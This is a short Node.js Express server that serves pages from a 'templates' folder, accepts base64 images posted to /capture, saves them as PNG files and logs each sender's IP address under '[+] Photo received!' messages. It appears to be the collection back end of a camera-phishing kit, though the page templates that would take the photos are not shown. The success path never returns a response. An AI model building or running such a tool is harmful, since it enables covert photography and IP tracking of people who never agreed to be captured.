const express = require("express"); 
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 3000;

// Ensure the 'capture' directory exists
const captureDir = path.join(__dirname, "capture");
if (!fs.existsSync(captureDir)) {
    fs.mkdirSync(captureDir);
}

app.use(express.static("templates"));
app.use(express.json({ limit: "5mb" }));

// Handle image capture
app.post("/capture", (req, res) => {
    if (!req.body.image) {
        return res.sendStatus(400);
    }

    const userIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const imageData = req.body.image.replace(/^data:image\/png;base64,/, "");
    const imagePath = path.join(captureDir, `capture_${Date.now()}.png`);

    fs.writeFile(imagePath, imageData, "base64", (err) => {
        if (err) {
            console.error("Error saving image:", err);
            return res.sendStatus(500);
        }

        console.log(`[+] Photo received! IP: ${userIP}`);
        fs.appendFileSync("server.log", `Photo received! IP: ${userIP}\n`);

    });
});

app.listen(PORT, () => {
    console.log(`[+] Server running at http://localhost:${PORT}`);
});
